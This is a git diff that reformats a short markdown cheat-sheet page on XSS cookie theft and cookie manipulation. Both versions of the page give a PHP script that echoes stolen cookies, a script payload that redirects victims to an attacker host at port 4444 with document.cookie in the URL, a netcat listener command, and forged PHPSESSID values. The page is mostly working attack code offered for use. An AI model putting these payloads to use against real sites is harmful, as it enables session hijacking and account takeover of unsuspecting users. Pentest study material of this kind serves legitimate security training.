@@ -6,7 +6,7 @@ alts: [XSS]
 render_with_liquid: false
 ---
 
-## 1. Cookie Manipulation
+## Cookie Manipulation
 
 ```html
 Cookie: PHPSESSID=0
@@ -19,28 +19,25 @@ Cookie: PHPSESSID=3836382d61646d696e
 
 <br />
 
-## 2. PHP Cookie Grabbing with XSS
+## PHP Cookie Grabbing with XSS
 
-1. **Create the Payload for Grabbing the Cookie when the Other UserS will Access Your Machine.**
+In your local machine, create the payload for grabbing the cookie when the other user will access your machine.  
 
-    In your local machine, create the payload to get the other cookie values.
+```php
+// steal_cookie.php
 
-    ```php
-    // steal_cookie.php
+<?php echo $_GET['cookie']; ?>
+```
 
-    <?php echo $_GET['cookie']; ?>
-    ```
+Create the JavaScript code to force users to access your machine which shows the victim's cookie value.
 
-2. **Create the JavaScript Code to Force Users to Access Your Machine which Shows the Victim's Cookie Value.**
+```javascript
+<script>document.location = 'http://<attacker-ip>:4444/steal_cookie.php?cookie='+document.cookie</script>
+```
 
-    ```javascript
-    <script>document.location = 'http://<attacker-ip>:4444/steal_cookie.php?cookie='+document.cookie</script>
-    ```
+POST request with this JavaScript code to the target web page.  
+Open listner in your local machine and wait for the other users will access the target web page.
 
-3. **POST Request with This JavaScript Code to the Target Web Page.**
-
-4. **Open Listner in Your Local Machine and Wait for the Other Users will Access the Target Web Page.**
-
-    ```sh
-    nc -lvnp 4444
-    ```
+```sh
+nc -lvnp 4444
+```
